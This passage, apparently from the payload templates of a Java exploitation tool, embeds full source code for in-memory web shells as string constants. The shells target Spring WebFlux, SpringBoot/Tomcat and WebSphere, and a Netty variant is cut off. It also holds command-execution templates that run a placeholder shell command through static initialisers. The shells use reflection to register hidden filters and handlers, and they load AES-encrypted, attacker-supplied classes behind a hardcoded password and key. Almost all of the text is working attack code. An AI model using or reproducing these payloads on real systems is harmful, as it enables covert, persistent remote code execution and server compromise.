            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @PostMapping(\"/xx\")\n" +
            "    public synchronized ResponseEntity xx(\n" +
            "            ServerWebExchange pdata) {\n" +
            "        try {\n" +
            "            Object bufferStream = pdata.getFormData().flatMap(c -> {\n" +
            "                StringBuilder result = new StringBuilder();\n" +
            "                try {\n" +
            "                    String id = c.getFirst(pass);\n" +
            "                    byte[] data = x(base64Decode(id), false);\n" +
            "                    if (store.get(\"payload\") == null) {\n" +
            "                        store.put(\"payload\", defineClass(data));\n" +
            "                    } else {\n" +
            "                        store.put(\"parameters\", data);\n" +
            "                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                        Object f = ((Class) store.get(\"payload\")).newInstance();\n" +
            "                        f.equals(arrOut);\n" +
            "                        f.equals(data);\n" +
            "                        result.append(md5.substring(0, 16));\n" +
            "                        f.toString();\n" +
            "                        result.append(base64Encode(x(arrOut.toByteArray(), true)));\n" +
            "                        result.append(md5.substring(16));\n" +
            "                    }\n" +
            "                } catch (Exception ex) {\n" +
            "                    result.append(ex.getMessage());\n" +
            "                }\n" +
            "                return Mono.just(result.toString());\n" +
            "            });\n" +
            "            return new ResponseEntity(bufferStream, HttpStatus.OK);\n" +
            "        } catch (Exception ex) {\n" +
            "            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "}";

    public static final String SpringBootMemShell =
            "import org.apache.catalina.LifecycleState;\n" +
            "import org.apache.catalina.core.ApplicationContext;\n" +
            "import org.apache.catalina.core.StandardContext;\n" +
            "import org.apache.catalina.util.LifecycleBase;\n" +
            "\n" +
            "import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.*;\n" +
            "import javax.servlet.FilterRegistration.Dynamic;\n" +
            "import javax.servlet.http.HttpServletRequest;\n" +
            "import javax.servlet.http.HttpServletResponse;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.math.BigInteger;\n" +
            "import java.security.MessageDigest;\n" +
            "import java.util.EnumSet;\n" +
            "\n" +
            "public class SpringBootMemShell extends ClassLoader implements Filter {\n" +
            "    public HttpServletRequest request = null;\n" +
            "    public HttpServletResponse response = null;\n" +
            "    String xc = \"3c6e0b8a9c15224a\";\n" +
            "    public String Pwd = \"pAS3\";\n" +
            "    public String path = \"/*\";\n" +
            "    String md5;\n" +
            "    public String cs;\n" +
            "\n" +
            "    public SpringBootMemShell() {\n" +
            "        this.md5 = md5(this.Pwd + this.xc);\n" +
            "        this.cs = \"UTF-8\";\n" +
            "    }\n" +
            "\n" +
            "    public SpringBootMemShell(ClassLoader z) {\n" +
            "        super(z);\n" +
            "        this.md5 = md5(this.Pwd + this.xc);\n" +
            "        this.cs = \"UTF-8\";\n" +
            "    }\n" +
            "\n" +
            "    public Class Q(byte[] cb) {\n" +
            "        return super.defineClass(cb, 0, cb.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            Cipher c = Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception var4) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "\n" +
            "        try {\n" +
            "            MessageDigest m = MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();\n" +
            "        } catch (Exception var3) {\n" +
            "        }\n" +
            "\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs)));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs)));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public boolean equals(Object obj) {\n" +
            "        this.parseObj(obj);\n" +
            "        try {\n" +
            "            this.addFilter();\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "        return true;\n" +
            "    }\n" +
            "\n" +
            "    public void parseObj(Object obj) {\n" +
            "        if (obj.getClass().isArray()) {\n" +
            "            Object[] data = (Object[])((Object[])((Object[])obj));\n" +
            "            this.request = (HttpServletRequest)data[0];\n" +
            "            this.response = (HttpServletResponse)data[1];\n" +
            "        } else {\n" +
            "            try {\n" +
            "                Class clazz = Class.forName(\"javax.servlet.jsp.PageContext\");\n" +
            "                this.request = (HttpServletRequest)clazz.getDeclaredMethod(\"getRequest\").invoke(obj);\n" +
            "                this.response = (HttpServletResponse)clazz.getDeclaredMethod(\"getResponse\").invoke(obj);\n" +
            "            } catch (Exception var8) {\n" +
            "                if (obj instanceof HttpServletRequest) {\n" +
            "                    this.request = (HttpServletRequest)obj;\n" +
            "\n" +
            "                    try {\n" +
            "                        Field req = this.request.getClass().getDeclaredField(\"request\");\n" +
            "                        req.setAccessible(true);\n" +
            "                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);\n" +
            "                        Field resp = request2.getClass().getDeclaredField(\"response\");\n" +
            "                        resp.setAccessible(true);\n" +
            "                        this.response = (HttpServletResponse)resp.get(request2);\n" +
            "                    } catch (Exception var7) {\n" +
            "                        try {\n" +
            "                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod(\"getResponse\").invoke(obj);\n" +
            "                        } catch (Exception var6) {\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void addFilter() throws Exception {\n" +
            "        ServletContext servletContext = this.request.getServletContext();\n" +
            "        Filter filter = this;\n" +
            "        String filterName = this.path;\n" +
            "        String url = this.path;\n" +
            "        if (servletContext.getFilterRegistration(filterName) == null) {\n" +
            "            Field contextField = null;\n" +
            "            ApplicationContext applicationContext = null;\n" +
            "            StandardContext standardContext = null;\n" +
            "            Field stateField = null;\n" +
            "            Dynamic filterRegistration = null;\n" +
            "\n" +
            "            String var11;\n" +
            "            try {\n" +
            "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
            "                contextField.setAccessible(true);\n" +
            "                applicationContext = (ApplicationContext)contextField.get(servletContext);\n" +
            "                contextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
            "                contextField.setAccessible(true);\n" +
            "                standardContext = (StandardContext)contextField.get(applicationContext);\n" +
            "                stateField = LifecycleBase.class.getDeclaredField(\"state\");\n" +
            "                stateField.setAccessible(true);\n" +
            "                stateField.set(standardContext, LifecycleState.STARTING_PREP);\n" +
            "                filterRegistration = servletContext.addFilter(filterName, filter);\n" +
            "                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});\n" +
            "                Method filterStartMethod = StandardContext.class.getMethod(\"filterStart\");\n" +
            "                filterStartMethod.setAccessible(true);\n" +
            "                filterStartMethod.invoke(standardContext, (Object[])null);\n" +
            "                stateField.set(standardContext, LifecycleState.STARTED);\n" +
            "                var11 = null;\n" +
            "\n" +
            "                Class filterMap;\n" +
            "                try {\n" +
            "                    filterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");\n" +
            "                } catch (Exception var22) {\n" +
            "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
            "                }\n" +
            "\n" +
            "                Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\");\n" +
            "                Object[] filterMaps = (Object[])((Object[])((Object[])findFilterMaps.invoke(standardContext)));\n" +
            "\n" +
            "                for(int i = 0; i < filterMaps.length; ++i) {\n" +
            "                    Object filterMapObj = filterMaps[i];\n" +
            "                    findFilterMaps = filterMap.getMethod(\"getFilterName\");\n" +
            "                    String name = (String)findFilterMaps.invoke(filterMapObj);\n" +
            "                    if (name.equalsIgnoreCase(filterName)) {\n" +
            "                        filterMaps[i] = filterMaps[0];\n" +
            "                        filterMaps[0] = filterMapObj;\n" +
            "                    }\n" +
            "                }\n" +
            "            } catch (Exception var23) {\n" +
            "                var11 = var23.getMessage();\n" +
            "            } finally {\n" +
            "                stateField.set(standardContext, LifecycleState.STARTED);\n" +
            "            }\n" +
            "\n" +
            "        } else {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public void init(FilterConfig filterConfig) throws ServletException {\n" +
            "    }\n" +
            "\n" +
            "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n" +
            "        try{\n" +
            "            request = (HttpServletRequest)servletRequest;\n" +
            "            response = (HttpServletResponse)servletResponse;\n" +
            "            if (request.getHeader(\"X-Requested-With\") != null && request.getHeader(\"X-Requested-With\").indexOf(\"XMLHTTPRequest\") != -1){\n" +
            "                HttpSession session = request.getSession();\n" +
            "//                this.noLog(request);\n" +
            "                byte[] data = base64Decode(request.getParameter(this.Pwd));\n" +
            "                data = this.x(data, false);\n" +
            "                if (session.getAttribute(\"memshell.payload\") == null) {\n" +
            "                    session.setAttribute(\"memshell.payload\", (new SpringBootMemShell(this.getClass().getClassLoader())).Q(data));\n" +
            "                } else {\n" +
            "                    request.setAttribute(\"parameters\", data);\n" +
            "                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();\n" +
            "                    Object f = ((Class)session.getAttribute(\"memshell.payload\")).newInstance();\n" +
            "                    f.equals(arrOut);\n" +
            "                    f.equals(data);\n" +
            "                    f.equals(request);\n" +
            "                    response.getWriter().write(this.md5.substring(0, 16));\n" +
            "                    f.toString();\n" +
            "                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));\n" +
            "                    response.getWriter().write(this.md5.substring(16));\n" +
            "                }\n" +
            "            }\n" +
            "            else if (request.getHeader(\"X-Requested-With\") != null && request.getHeader(\"X-Requested-With\").indexOf(\"XmlHTTPRequest\") != -1) {\n" +
            "                response.getWriter().write(\"Success\");\n" +
            "            }\n" +
            "            else{\n" +
            "                filterChain.doFilter(servletRequest,servletResponse);\n" +
            "            }\n" +
            "        } catch (Exception var9) {\n" +
            "            var9.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void destroy() {\n" +
            "    }\n" +
            "}\n";

    public static final String SpringWebfluxHandlerMemShellAbstractTranslet = "" +
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "import org.springframework.http.HttpStatus;\n" +
            "import org.springframework.http.ResponseEntity;\n" +
            "import org.springframework.web.bind.annotation.PostMapping;\n" +
            "import org.springframework.web.reactive.result.method.RequestMappingInfo;\n" +
            "import org.springframework.web.server.ServerWebExchange;\n" +
            "import reactor.core.publisher.Mono;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "\n" +
            "public class SpringWebfluxHandlerMemShellAbstractTranslet extends AbstractTranslet {\n" +
            "    public static Map<String, Object> store = new HashMap<String , Object>();\n" +
            "    public static String pass = \"pAS3\", md5, xc = \"3c6e0b8a9c15224a\";\n" +
            "\n" +
            "    public static String doInject(Object obj, String path) {\n" +
            "        String msg;\n" +
            "        try {\n" +
            "            md5 = md5(pass + xc);\n" +
            "            Method registerHandlerMethod = obj.getClass().getDeclaredMethod(\"registerHandlerMethod\", Object.class, Method.class, RequestMappingInfo.class);\n" +
            "            registerHandlerMethod.setAccessible(true);\n" +
            "            Method executeCommand = SpringWebfluxHandlerMemShell.class.getDeclaredMethod(\"xx\", ServerWebExchange.class);\n" +
            "            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();\n" +
            "            registerHandlerMethod.invoke(obj, new SpringWebfluxHandlerMemShell(), executeCommand, requestMappingInfo);\n" +
            "            msg = \"ok\";\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "            msg = \"error\";\n" +
            "        }\n" +
            "        return msg;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static Class defineClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @PostMapping(\"/xx\")\n" +
            "    public synchronized ResponseEntity xx(\n" +
            "            ServerWebExchange pdata) {\n" +
            "        try {\n" +
            "            Object bufferStream = pdata.getFormData().flatMap(c -> {\n" +
            "                StringBuilder result = new StringBuilder();\n" +
            "                try {\n" +
            "                    String id = c.getFirst(pass);\n" +
            "                    byte[] data = x(base64Decode(id), false);\n" +
            "                    if (store.get(\"payload\") == null) {\n" +
            "                        store.put(\"payload\", defineClass(data));\n" +
            "                    } else {\n" +
            "                        store.put(\"parameters\", data);\n" +
            "                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                        Object f = ((Class) store.get(\"payload\")).newInstance();\n" +
            "                        f.equals(arrOut);\n" +
            "                        f.equals(data);\n" +
            "                        result.append(md5.substring(0, 16));\n" +
            "                        f.toString();\n" +
            "                        result.append(base64Encode(x(arrOut.toByteArray(), true)));\n" +
            "                        result.append(md5.substring(16));\n" +
            "                    }\n" +
            "                } catch (Exception ex) {\n" +
            "                    result.append(ex.getMessage());\n" +
            "                }\n" +
            "                return Mono.just(result.toString());\n" +
            "            });\n" +
            "            return new ResponseEntity(bufferStream, HttpStatus.OK);\n" +
            "        } catch (Exception ex) {\n" +
            "            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
            "        \n" +
            "    }\n" +
            "}";

    public static final String WebSphereFilterMemShell =
                            "import sun.misc.BASE64Decoder;\n" +
                            "\n" +
                            "import javax.servlet.DispatcherType;\n" +
                            "import javax.servlet.Filter;\n" +
                            "import java.io.IOException;\n" +
                            "import java.lang.reflect.InvocationTargetException;\n" +
                            "import java.lang.reflect.Method;\n" +
                            "import java.util.EnumSet;\n" +
                            "import java.util.List;\n" +
                            "\n" +
                            "public class WebSphereFilterMemShell {\n" +
                            "\n" +
                            "    static{\n" +
                            "        Inject();\n" +
                            "    }\n" +
                            "\n" +
                            "    public WebSphereFilterMemShell(){\n" +
                            "        Inject();\n" +
                            "    }\n" +
                            "\n" +
                            "    public static synchronized Class getDynamicFilterTemplateClass() {\n" +
                            "        ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
                            "        Class clazz = null;\n" +
                            "        try{\n" +
                            "            clazz = cl.loadClass(\"memshell.WebSphereFilterShell\");\n" +
                            "        }catch(ClassNotFoundException e){\n" +
                            "            BASE64Decoder base64Decoder = new BASE64Decoder();\n" +
                            "            String codeClass = \"\";\n" +
                            "            byte[] bytes = new byte[0];\n" +
                            "            try {\n" +
                            "                bytes = base64Decoder.decodeBuffer(codeClass);\n" +
                            "            } catch (IOException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            }\n" +
                            "\n" +
                            "            Method method = null;\n" +
                            "            Class clz = cl.getClass();\n" +
                            "            while(method == null && clz != Object.class ){\n" +
                            "                try{\n" +
                            "                    method = clz.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                            "                }catch(NoSuchMethodException ex){\n" +
                            "                    clz = clz.getSuperclass();\n" +
                            "                }\n" +
                            "            }\n" +
                            "            method.setAccessible(true);\n" +
                            "            try {\n" +
                            "                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);\n" +
                            "            } catch (IllegalAccessException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            } catch (InvocationTargetException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            }\n" +
                            "        }\n" +
                            "\n" +
                            "        return clazz;\n" +
                            "    }\n" +
                            "\n" +
                            "    public static synchronized void Inject(){\n" +
                            "        try{\n" +
                            "            String filterName = \"memshell.WebSphereFilterMemShell\";\n" +
                            "            String urlPattern = \"/*\";\n" +
                            "\n" +
                            "            Class clazz = Thread.currentThread().getClass();\n" +
                            "            java.lang.reflect.Field field = clazz.getDeclaredField(\"wsThreadLocals\");\n" +
                            "            field.setAccessible(true);\n" +
                            "            Object obj = field.get(Thread.currentThread());\n" +
                            "\n" +
                            "            Object[] obj_arr = (Object[]) obj;\n" +
                            "            for(int j = 0; j < obj_arr.length; j++){\n" +
                            "                Object o = obj_arr[j];\n" +
                            "                if(o == null) continue;\n" +
                            "\n" +
                            "                if(o.getClass().getName().endsWith(\"WebContainerRequestState\")){\n" +
                            "                    Object request = o.getClass().getMethod(\"getCurrentThreadsIExtendedRequest\", new Class[0]).invoke(o, new Object[0]);\n" +
                            "                    Object servletContext = request.getClass().getMethod(\"getServletContext\", new Class[0]).invoke(request, new Object[0]);\n" +
                            "\n" +
                            "                    field = servletContext.getClass().getDeclaredField(\"context\");\n" +
                            "                    field.setAccessible(true);\n" +
                            "                    Object context = field.get(servletContext);\n" +
                            "\n" +
                            "                    field = context.getClass().getSuperclass().getDeclaredField(\"config\");\n" +
                            "                    field.setAccessible(true);\n" +
                            "                    Object webAppConfiguration = field.get(context);\n" +
                            "\n" +
                            "                    Method method = null;\n" +
                            "                    Method[] methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                    for(int i = 0; i < methods.length; i++){\n" +
                            "                        if(methods[i].getName().equals(\"getFilterMappings\")){\n" +
                            "                            method = methods[i];\n" +
                            "                            break;\n" +
                            "                        }\n" +
                            "                    }\n" +
                            "                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);\n" +
                            "\n" +
                            "                    boolean flag = false;\n" +
                            "                    for(int i = 0; i < filerMappings.size(); i++){\n" +
                            "                        Object filterConfig = filerMappings.get(i).getClass().getMethod(\"getFilterConfig\", new Class[0]).invoke(filerMappings.get(i), new Object[0]);\n" +
                            "                        String name = (String) filterConfig.getClass().getMethod(\"getFilterName\", new Class[0]).invoke(filterConfig, new Object[0]);\n" +
                            "                        if(name.equals(filterName)){\n" +
                            "                            flag = true;\n" +
                            "                            break;\n" +
                            "                        }\n" +
                            "                    }\n" +
                            "\n" +
                            "                    //如果已存在同名的 Filter，就不在添加，防止重复添加\n" +
                            "                    if(!flag){\n" +
                            "                        clazz = getDynamicFilterTemplateClass();\n" +
                            "\n" +
                            "                        Object filterConfig = context.getClass().getMethod(\"createFilterConfig\", new Class[]{String.class}).invoke(context, new Object[]{filterName});\n" +
                            "                        Object filter = clazz.newInstance();\n" +
                            "                        filterConfig.getClass().getMethod(\"setFilter\", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});\n" +
                            "\n" +
                            "                        method = null;\n" +
                            "                        methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                        for(int i = 0; i < methods.length; i++){\n" +
                            "                            if(methods[i].getName().equals(\"addFilterInfo\")){\n" +
                            "                                method = methods[i];\n" +
                            "                                break;\n" +
                            "                            }\n" +
                            "                        }\n" +
                            "                        method.invoke(webAppConfiguration, new Object[]{filterConfig});\n" +
                            "\n" +
                            "                        field = filterConfig.getClass().getSuperclass().getDeclaredField(\"context\");\n" +
                            "                        field.setAccessible(true);\n" +
                            "                        Object original = field.get(filterConfig);\n" +
                            "\n" +
                            "                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常\n" +
                            "                        field.set(filterConfig, null);\n" +
                            "\n" +
                            "                        method = filterConfig.getClass().getDeclaredMethod(\"addMappingForUrlPatterns\", new Class[]{EnumSet.class, boolean.class, String[].class});\n" +
                            "                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});\n" +
                            "\n" +
                            "                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值\n" +
                            "                        field.set(filterConfig, original);\n" +
                            "\n" +
                            "                        method = null;\n" +
                            "                        methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                        for(int i = 0; i < methods.length; i++){\n" +
                            "                            if(methods[i].getName().equals(\"getUriFilterMappings\")){\n" +
                            "                                method = methods[i];\n" +
                            "                                break;\n" +
                            "                            }\n" +
                            "                        }\n" +
                            "\n" +
                            "                        //这里的目的是为了将我们添加的动态 Filter 放到第一位\n" +
                            "                        List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);\n" +
                            "                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));\n" +
                            "                    }\n" +
                            "\n" +
                            "                    break;\n" +
                            "                }\n" +
                            "            }\n" +
                            "        }catch(Exception e){\n" +
                            "            e.printStackTrace();\n" +
                            "        }\n" +
                            "    }\n" +
                            "}\n" +
                            "\n";

    public static String ExecTemplateJDK7 = "\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.util.Scanner;\n" +
            "\n" +
            "\n" +
            "public class ExecTemplateJDK7{\n" +
            "\n" +
            "    public ExecTemplateJDK7(){\n" +
            "        try {\n" +
            "            String cmd = \"{{cmd}}\";\n" +
            "            boolean isLinux = true;\n" +
            "            String osTyp = System.getProperty(\"os.name\");\n" +
            "            if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
            "                isLinux = false;\n" +
            "            }\n" +
            "            String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "            Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "static{\n" +
            "        new ExecTemplateJDK7();\n" +
            "}\n" +
            "}";
    public static String ExecTemplateJDK8 = "\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.util.Scanner;\n" +
            "\n" +
            "\n" +
            "public class ExecTemplateJDK8{\n" +
            "\n" +
            "    public ExecTemplateJDK8(){\n" +
            "        try {\n" +
            "            String cmd = \"{{cmd}}\";\n" +
            "            boolean isLinux = true;\n" +
            "            String osTyp = System.getProperty(\"os.name\");\n" +
            "            if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
            "                isLinux = false;\n" +
            "            }\n" +
            "            String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
            "            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
            "            Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "static{\n" +
            "        new ExecTemplateJDK8();\n" +
            "}\n" +
            "}";

    public static String NettyHandlerMemShell =
            "import io.netty.buffer.ByteBuf;\n" +
            "import io.netty.buffer.Unpooled;\n" +
            "import io.netty.channel.*;\n" +
            "import io.netty.handler.codec.http.*;\n" +
            "import reactor.netty.ChannelPipelineConfigurer;\n" +
            "import reactor.netty.ConnectionObserver;\n" +
            "\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.SocketAddress;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.net.URLDecoder;\n" +
            "import java.util.AbstractMap;\n" +
            "\n" +
            "\n" +
            "public class NettyHandlerMemShell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {\n" +
            "\n" +
            "    public NettyHandlerMemShell() {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static void doInject(Object o, String path) {\n" +
            "\n" +
            "        try {\n" +
            "            Method getThreads = Thread.class.getDeclaredMethod(\"getThreads\");\n" +
            "            getThreads.setAccessible(true);\n" +
            "            Object threads = getThreads.invoke(null);\n" +
            "\n" +
            "            for (int i = 0; i < Array.getLength(threads); i++) {\n" +
            "                Object thread = Array.get(threads, i);\n" +
            "                if (thread != null && thread.getClass().getName().contains(\"NettyWebServer\")) {\n" +
